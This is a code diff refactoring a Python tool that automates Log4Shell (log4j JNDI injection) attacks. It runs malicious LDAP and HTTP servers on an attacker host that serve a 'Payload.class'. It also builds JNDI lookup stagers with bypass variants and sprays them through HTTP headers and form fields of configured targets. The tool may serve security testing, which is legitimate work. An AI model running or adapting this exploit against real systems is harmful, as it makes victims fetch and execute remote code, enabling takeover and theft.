@@ -79,11 +79,12 @@ class JNDI(services.Service):
     }
 
     def __init__(self, *args, **kwargs):
+        context = kwargs.pop('context')
         super().__init__(*args, **kwargs)
         for ldap_type in self.RESPONSE_LDAP.values():
             for key, val in ldap_type.items():
                 try:
-                    ldap_type[key] = string.Template(val).substitute(**self.scenario.context)                
+                    ldap_type[key] = string.Template(val).substitute(context)                
                 except KeyError:
                     pass
 
@@ -125,37 +126,38 @@ class JNDI(services.Service):
         writer.close()
 
 
-async def send_requests(scenario):
+class SendRequests(scenarios.Scene):
 
-    stagers = list()
-    for ldap_type in JNDI.RESPONSE_LDAP.keys():
-        for port in config.JNDI_PORTS:
-            for bypass in config.BYPASSES:
-                stagers.append(
-                    Template('${' + bypass + '/' + ldap_type + '}').substitute(JNDI_PORT=port, **scenario.context)
-                )
+    async def task(self):
+        stagers = list()
+        for ldap_type in JNDI.RESPONSE_LDAP.keys():
+            for port in config.JNDI_PORTS:
+                for bypass in config.BYPASSES:
+                    stagers.append(
+                        Template('${' + bypass + '/' + ldap_type + '}').substitute(JNDI_PORT=port, **self.context)
+                    )
 
-    for stager in stagers:
-        logging.debug('Using stager: ' + stager)
-        for header in config.HTTP_HEADERS:
-            logging.debug('Using header: ' + header)
-            headers = {header: stager}
-            for target in config.TARGETS:
-                response = await scenario.http_get(
-                    target,
-                    headers,
-                )
-                logging.debug('Got HTTP response: ' + str(response))
-                if response['status'] == 200:
-                    input_fields = BeautifulSoup(response['content'], 'html.parser').find_all('input')
-                    if input_fields:
-                        data = {field.get('name'): stager for field in input_fields}
-                        response = await scenario.http_post(
-                            target,
-                            data,
-                            headers,
-                        )
-                        logging.debug('Got HTTP response: ' + str(response))
+        for stager in stagers:
+            logging.debug('Using stager: ' + stager)
+            for header in config.HTTP_HEADERS:
+                logging.debug('Using header: ' + header)
+                headers = {header: stager}
+                for target in config.TARGETS:
+                    response = await self.http_get(
+                        target,
+                        headers,
+                    )
+                    logging.debug('Got HTTP response: ' + str(response))
+                    if response['status'] == 200:
+                        input_fields = BeautifulSoup(response['content'], 'html.parser').find_all('input')
+                        if input_fields:
+                            data = {field.get('name'): stager for field in input_fields}
+                            response = await self.http_post(
+                                target,
+                                data,
+                                headers,
+                            )
+                            logging.debug('Got HTTP response: ' + str(response))
 
 
 class Server(services.HTTPStatic):
@@ -180,21 +182,22 @@ if __name__ == '__main__':
         'COLLECTOR_PORT': config.COLLECTOR_PORT,
     }
 
-    story = scenarios.Scenario(**context)
-    # story.set_proxy('http://127.0.0.1:8088')
-    story.set_headers({
-        'User-Agent': 'Automated log4j testing',
-    })
 
-    httpd = Server(story, address=context['ATTACKER_HOST'], port=context['ATTACKER_PORT'])
+    httpd = Server(address=context['ATTACKER_HOST'], port=context['ATTACKER_PORT'])
     httpd.add_route('/', 'Welcome')
     httpd.add_route('/send-requests', 'Sending requests...')
     httpd.add_route('/Payload.class', Server.payload)
     httpd.add_event('run', when=events.PathContains('send-requests'))
 
+    story = scenarios.Scenario(**context)
+    # story.set_proxy('http://127.0.0.1:8088')
+    story.set_headers({
+        'User-Agent': 'Automated log4j testing',
+    })
     story.set_debug()
+    story.add_service(httpd)
     for port in config.JNDI_PORTS:
-        JNDI(story, address=context['ATTACKER_HOST'], port=port)
-    story.add_scene(send_requests, when='run')
-    story.add_scene(send_requests)
+        story.add_service(JNDI(address=context['ATTACKER_HOST'], port=port, context=context))
+    story.add_scene(SendRequests, when='run')
+    story.add_scene(SendRequests)
     story.play()
